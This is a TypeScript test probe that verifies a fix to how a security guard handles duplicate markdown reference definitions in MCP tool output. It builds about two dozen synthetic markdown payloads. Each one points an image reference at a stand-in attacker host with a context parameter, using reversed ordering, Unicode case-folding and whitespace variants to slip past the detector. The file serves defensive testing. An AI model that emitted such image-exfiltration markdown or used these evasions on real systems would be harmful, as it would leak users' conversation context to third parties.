// T82 — independent verification of T81's duplicate-definition repair.
//
// T78#F-002 reproduced six spellings; T81 replaced the last-wins `Map.set` with a
// LIST and flags every definition of a label an image use resolves. This probe is
// written from the standard rather than from T78's list: it re-runs the six, adds
// the REVERSED order (attacker second), adds Unicode case-folding collisions that
// the implementer's own two counterexamples imply, adds allowlist interactions,
// and adds controls that must NOT be flagged.
//
// Advisory redaction OFF; the mandatory floor is what is measured.
// Read-only, offline, synthetic/reserved hosts only.
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { marked } from "marked";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/safe.png";
const ALLOWED_HOST = "ok.example.org";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

// Every shape: { markdown, allowlist }. `expectFlagged` is what a floor that does
// not bet on a precedence rule must do.
type Shape = { md: string; allow?: string[]; note: string };

const shapes: Record<string, Shape> = {
  // ---- T78's six, re-run from the standard rather than copied blindly --------
  d1ShortcutDupDef: { md: `![a]\n\n[a]: ${U}\n[a]: ${OK}\n`, note: "T78 #1" },
  d2FullDupDef: { md: `![a][a]\n\n[a]: ${U}\n[a]: ${OK}\n`, note: "T78 #2" },
  d3CollapsedDupDef: { md: `![a][]\n\n[a]: ${U}\n[a]: ${OK}\n`, note: "T78 #3" },
  d4DupDefCaseSpelling: { md: `![a]\n\n[A]: ${U}\n[a]: ${OK}\n`, note: "T78 #4" },
  d5DupDefWhitespaceSpelling: { md: `![b c]\n\n[b  c]: ${U}\n[b c]: ${OK}\n`, note: "T78 #5" },
  d6ThreeDefs: { md: `![a]\n\n[a]: ${U}\n[a]: ${OK}\n[a]: ${OK}\n`, note: "T78 #6" },

  // ---- the reversed order: attacker is the SECOND definition ----------------
  r1ShortcutRev: { md: `![a]\n\n[a]: ${OK}\n[a]: ${U}\n`, note: "reversed" },
  r2FullRev: { md: `![a][a]\n\n[a]: ${OK}\n[a]: ${U}\n`, note: "reversed full" },
  r3CollapsedRev: { md: `![a][]\n\n[a]: ${OK}\n[a]: ${U}\n`, note: "reversed collapsed" },
  r4CaseRev: { md: `![a]\n\n[a]: ${OK}\n[A]: ${U}\n`, note: "reversed case" },
  r5WhitespaceRev: { md: `![b c]\n\n[b c]: ${OK}\n[b  c]: ${U}\n`, note: "reversed ws" },
  r6MiddleOfThree: { md: `![a]\n\n[a]: ${OK}\n[a]: ${U}\n[a]: ${OK}\n`, note: "attacker in the middle" },

  // ---- spellings the standard's label matching implies, not in T78's list ----
  u1TurkishDottedI: { md: `![İ]\n\n[İ]: ${U}\n[i̇]: ${OK}\n`, note: "toLowerCase lengthens" },
  u2TurkishDottedIRev: { md: `![i̇]\n\n[i̇]: ${OK}\n[İ]: ${U}\n`, note: "same, reversed" },
  u3FinalSigma: { md: `![ΟΣ]\n\n[ΟΣ]: ${U}\n[ος]: ${OK}\n`, note: "Final_Sigma" },
  u4FinalSigmaRev: { md: `![οσ]\n\n[οσ]: ${OK}\n[ΟΣ]: ${U}\n`, note: "Final_Sigma reversed" },
  w1TabNewlineLabel: { md: `![b c]\n\n[b\tc]: ${U}\n[b\nc]: ${OK}\n`, note: "tab/newline collapse" },
  w2LeadingTrailingWs: { md: `![a]\n\n[ a ]: ${U}\n[a]: ${OK}\n`, note: "trim collision" },
  e1EscapedCloseInLabel: { md: `![foo\\]]\n\n[foo\\]]: ${U}\n`, note: "backslash-escaped ] in label" },
  e2EscapedCloseDup: { md: `![foo\\]]\n\n[foo\\]]: ${U}\n[foo\\]]: ${OK}\n`, note: "escaped ], duplicated" },
  i1IndentedDup: { md: `![a]\n\n   [a]: ${U}\n[a]: ${OK}\n`, note: "3-space indented definition" },
  t1TitledDup: { md: `![a]\n\n[a]: ${U} "t"\n[a]: ${OK} "t"\n`, note: "definition with title" },
  n1BracketInKeyDup: { md: `![a[b]\n\n[a[b]: ${U}\n[a[b]: ${OK}\n`, note: "key containing [" },

  // ---- allowlist interactions ----------------------------------------------
  a1AllowFirstAttackerSecond: { md: `![a]\n\n[a]: ${OK}\n[a]: ${U}\n`, allow: [ALLOWED_HOST], note: "allowlisted first" },
  a2AllowSecondAttackerFirst: { md: `![a]\n\n[a]: ${U}\n[a]: ${OK}\n`, allow: [ALLOWED_HOST], note: "allowlisted second" },

  // ---- controls that must keep behaving -------------------------------------
  c1SingleDef: { md: `![a]\n\n[a]: ${U}\n`, note: "control: single def" },
  c2DupNoImageUse: { md: `text\n\n[a]: ${U}\n[a]: ${OK}\n`, note: "control: dup, no use" },
  c3DupLinkUseOnly: { md: `[a]\n\n[a]: ${U}\n[a]: ${OK}\n`, note: "control: link use is click-gated" },
  c4DupBenignBoth: { md: `![a]\n\n[a]: ${OK}\n[a]: ${OK}?v=2\n`, note: "control: benign duplicate" },
  c5DistinctLabels: { md: `![a] ![b]\n\n[a]: ${OK}\n[b]: ${OK}?v=2\n`, note: "control: no duplication" },
};

const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, s]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: s.md }),
  })),
};

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}

const rows: Array<Record<string, unknown>> = [];
for (const [name, s] of Object.entries(shapes)) {
  const text = s.md;
  const serialized = JSON.stringify({ note: text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  const imgs = rendererImgSrcs(text);
  const findings = detectExfil(text, s.allow ?? []);
  rows.push({
    id: name,
    note: s.note,
    allowlisted: (s.allow ?? []).length > 0,
    rendererFetches: imgs,
    rendererFetchesAttacker: imgs.some((x) => x.includes(ATT)),
    detectorFindings: findings.length,
    detectorMaskedValues: findings.map((f) => String(f.value)),
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    mcpLeaksAttacker: JSON.stringify(call).includes(ATT),
    persistLeaksAttacker: persisted.allowed ? persisted.content.includes(ATT) : false,
    transportState: transported.redaction.state,
    transportLeaksAttacker: transported.text.includes(ATT),
    seamLeaksAttacker: seamText.includes(ATT),
  });
}

// A leak in the zero-click sense: the renderer fetches the attacker host AND at
// least one public boundary still carries it.
const zeroClickLeaks = rows.filter(
  (r) =>
    r.rendererFetchesAttacker &&
    (r.mcpLeaksAttacker || r.persistLeaksAttacker || r.transportLeaksAttacker || r.seamLeaksAttacker),
);
// A weaker class: the host survives a boundary even though no renderer fetches it.
const textResidue = rows.filter(
  (r) =>
    !r.rendererFetchesAttacker &&
    (r.mcpLeaksAttacker || r.persistLeaksAttacker || r.transportLeaksAttacker || r.seamLeaksAttacker),
);

console.log(
  JSON.stringify(
    {
      probe: "T82-dup",
      rows,
      zeroClickLeaks: zeroClickLeaks.map((r) => r.id),
      zeroClickLeakCount: zeroClickLeaks.length,
      textResidue: textResidue.map((r) => r.id),
    },
    null,
    2,
  ),
);
